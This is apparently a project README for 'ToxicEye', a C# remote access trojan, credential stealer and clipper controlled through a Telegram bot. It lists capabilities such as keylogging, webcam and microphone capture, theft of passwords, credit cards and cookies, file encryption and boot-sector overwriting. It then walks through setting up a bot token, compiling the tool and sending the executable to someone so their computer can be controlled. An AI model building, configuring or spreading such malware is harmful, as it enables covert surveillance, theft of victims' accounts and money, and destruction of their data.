# ToxicEye
telegram malware
🔱 ToxicEye (RAT + STEALER + CLIPPER)
Program for remote control of windows computers via telegram bot. Written in C#

![logo](https://user-images.githubusercontent.com/102240206/160681490-46809716-2e5a-4456-aa5c-746b33575fa1.png)


🍂 Functions:
ComputerInfo, BatteryInfo, Location, Whois, ActiveWindow, Webcam, Microphone, Desktop, Keylogger, ClipboardSet, ClipboardGet, ProcessList, ProcessKill, ProcessStart, TaskManagerDisable, TaskManagerEnable, MinimizeAllWindows, MaximizeAllWindows, GetPasswords, GetCreditCards, GetHistory, GetBookmarks, GetCookies, GetDesktop, GetFileZilla, GetDiscord, GetTelegram, GetSteam, OpenCD, CloseCD, DownloadFile, UploadFile, RunFile, RunFileAdmin, ListFiles, RemoveFile, RemoveDir, MoveFile, MoveDir, CopyFile, CopyDir, Speak, Shell, MessageBox, OpenURL, SendKeyPress, NetDiscover, AudioVolumeSet, AudioVolumeGet, SetWallPaper, BlockInput, Monitor(off/on), DisplayRotate, EncryptFileSystem, DecryptFileSystem,ForkBomb, BsoD, OverwriteBootSector, Shutdown, Reboot, Hibernate, Logoff, Help, About, Uninstall.

🔨 Compiling guide:
Go to the @BotFather bot and create your own bot. You need to save the token and bot name.

Now you need to get your chat id. To do this, go to the next bot @chatid_echo_bot and save the id.

Now you need to download Visual Studio 2019

Download the source code of this program.

Unzip the “Telegram RAT” folder to your desktop.
Open the TelegramRAT.sln file through Visual Studio.
Open file config.cs in project.

Insert your token from the bot and your chatID that you received earlier.
Above you need to select ”Release”.

Press CTRL + S to save. And CTRL + B to compile everything into an executable file.

You can send the received file to someone.
After starting the file, you can control the computer through the bot.

Write /help to see all available commands.
